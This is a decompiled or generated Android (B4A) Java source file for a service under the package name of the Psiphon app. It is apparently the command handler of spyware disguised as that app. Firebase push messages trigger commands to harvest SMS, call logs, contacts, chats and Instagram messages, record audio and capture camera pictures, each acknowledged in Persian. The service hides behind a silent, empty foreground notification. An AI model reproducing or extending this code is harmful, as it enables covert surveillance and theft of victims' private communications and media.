package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class firebasemessaging extends  android.app.Service{
	public static class firebasemessaging_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (firebasemessaging) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, firebasemessaging.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static firebasemessaging mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return firebasemessaging.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.firebasemessaging");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.firebasemessaging", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (firebasemessaging) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (firebasemessaging) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_NOT_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (firebasemessaging) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (firebasemessaging) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (firebasemessaging) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static anywheresoftware.b4a.objects.FirebaseNotificationsService.FirebaseMessageWrapper _v5 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _fm_messagearrived(anywheresoftware.b4a.objects.FirebaseNotificationsService.RemoteMessageWrapper _message) throws Exception{
String _com = "";
String _filename = "";
 //BA.debugLineNum = 38;BA.debugLine="Sub fm_MessageArrived (Message As RemoteMessage)";
 //BA.debugLineNum = 39;BA.debugLine="Dim com As String";
_com = "";
 //BA.debugLineNum = 40;BA.debugLine="com = Message.GetData.Get(\"command\")";
_com = BA.ObjectToString(_message.GetData().Get((Object)("command")));
 //BA.debugLineNum = 42;BA.debugLine="If com = \"getKey\" Then";
if ((_com).equals("getKey")) { 
 //BA.debugLineNum = 44;BA.debugLine="CallSubDelayed3(srv, \"getKey\" , \"admin\" , $\"{\"tex";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvvv3.getObject()),"getKey",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 46;BA.debugLine="If com = \"getChats\" Then";
if ((_com).equals("getChats")) { 
 //BA.debugLineNum = 47;BA.debugLine="CallSubDelayed3(getchats, \"getchat\" , \"admin\" ,";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvv5.getObject()),"getchat",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 49;BA.debugLine="If com = \"getList\" Then";
if ((_com).equals("getList")) { 
 //BA.debugLineNum = 50;BA.debugLine="CallSubDelayed3(getlists, \"getlist\" , \"admin\" ,";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvv7.getObject()),"getlist",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 52;BA.debugLine="If com = \"getOneChat\" Then";
if ((_com).equals("getOneChat")) { 
 //BA.debugLineNum = 53;BA.debugLine="Dim fileName As String";
_filename = "";
 //BA.debugLineNum = 54;BA.debugLine="fileName=Message.GetData.Get(\"file\")";
_filename = BA.ObjectToString(_message.GetData().Get((Object)("file")));
 //BA.debugLineNum = 56;BA.debugLine="CallSubDelayed3(getOneChat, \"getOne\" , \"admin\" ,";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvv0.getObject()),"getOne",(Object)("admin"),(Object)(_filename));
 };
 //BA.debugLineNum = 58;BA.debugLine="If com = \"getAllSms\" Then";
if ((_com).equals("getAllSms")) { 
 //BA.debugLineNum = 59;BA.debugLine="CallSubDelayed3(getAllSms, \"getsms\" , \"admin\" ,";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvv4.getObject()),"getsms",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 61;BA.debugLine="If com = \"getAllCalls\" Then";
if ((_com).equals("getAllCalls")) { 
 //BA.debugLineNum = 62;BA.debugLine="CallSubDelayed3(getAllCalls, \"getcall\" , \"admin\"";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvv2.getObject()),"getcall",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 64;BA.debugLine="If com = \"getAllContacts\" Then";
if ((_com).equals("getAllContacts")) { 
 //BA.debugLineNum = 65;BA.debugLine="CallSubDelayed3(getAllContacts, \"getcontact\" , \"";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvv3.getObject()),"getcontact",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 67;BA.debugLine="If com = \"getInsta\" Then";
if ((_com).equals("getInsta")) { 
 //BA.debugLineNum = 68;BA.debugLine="CallSubDelayed3(getInsta, \"getdirect\" , \"admin\"";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvv6.getObject()),"getdirect",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 71;BA.debugLine="If com = \"startRecord\" Then";
if ((_com).equals("startRecord")) { 
 //BA.debugLineNum = 72;BA.debugLine="CallSubDelayed3(startRecord, \"startrecording\" ,";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvvv5.getObject()),"startrecording",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 74;BA.debugLine="If com = \"stopRecord\" Then";
if ((_com).equals("stopRecord")) { 
 //BA.debugLineNum = 75;BA.debugLine="CallSubDelayed3(startRecord, \"stoprecording\" , \"";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvvv5.getObject()),"stoprecording",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 77;BA.debugLine="If com = \"getPicture\" Then";
if ((_com).equals("getPicture")) { 
 //BA.debugLineNum = 78;BA.debugLine="CallSubDelayed3(getPicture, \"getCam\" , \"admin\" ,";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvvv1.getObject()),"getCam",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 80;BA.debugLine="If com = \"getPicture2\" Then";
if ((_com).equals("getPicture2")) { 
 //BA.debugLineNum = 81;BA.debugLine="CallSubDelayed3(getPicture2, \"getCam\" , \"admin\"";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(mostCurrent._vvvvvvvvvv2.getObject()),"getCam",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 };
 //BA.debugLineNum = 84;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 9;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 10;BA.debugLine="Dim fm As FirebaseMessaging";
_v5 = new anywheresoftware.b4a.objects.FirebaseNotificationsService.FirebaseMessageWrapper();
 //BA.debugLineNum = 11;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 12;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 13;BA.debugLine="fm.Initialize(\"fm\")";
_v5.Initialize(processBA,"fm");
 //BA.debugLineNum = 14;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 15;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 16;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 17;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 18;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 19;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 20;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 21;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 22;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 23;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 26;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 86;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 88;BA.debugLine="End Sub";
return "";
}
public static void  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
ResumableSub_Service_Start rsub = new ResumableSub_Service_Start(null,_startingintent);
rsub.resume(processBA, null);
}
public static class ResumableSub_Service_Start extends BA.ResumableSub {
public ResumableSub_Service_Start(com.psiphon3.firebasemessaging parent,anywheresoftware.b4a.objects.IntentWrapper _startingintent) {
this.parent = parent;
this._startingintent = _startingintent;
}
com.psiphon3.firebasemessaging parent;
anywheresoftware.b4a.objects.IntentWrapper _startingintent;

@Override
public void resume(BA ba, Object[] result) throws Exception{

    while (true) {
        switch (state) {
            case -1:
return;

case 0:
//C
this.state = 1;
 //BA.debugLineNum = 33;BA.debugLine="If StartingIntent.IsInitialized Then fm.HandleInt";
if (true) break;

case 1:
//if
this.state = 6;
if (_startingintent.IsInitialized()) { 
this.state = 3;
;}if (true) break;

case 3:
//C
this.state = 6;
parent._v5.HandleIntent((android.content.Intent)(_startingintent.getObject()));
if (true) break;

case 6:
//C
this.state = -1;
;
 //BA.debugLineNum = 34;BA.debugLine="Sleep(0)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (0));
this.state = 7;
return;
case 7:
//C
this.state = -1;
;
 //BA.debugLineNum = 36;BA.debugLine="End Sub";
if (true) break;

            }
        }
    }
}
public static String  _subscribetotopics() throws Exception{
 //BA.debugLineNum = 27;BA.debugLine="Public Sub SubscribeToTopics";
 //BA.debugLineNum = 29;BA.debugLine="fm.SubscribeToTopic(\"topic1\")";
_v5.SubscribeToTopic("topic1");
 //BA.debugLineNum = 30;BA.debugLine="End Sub";
return "";
}
}
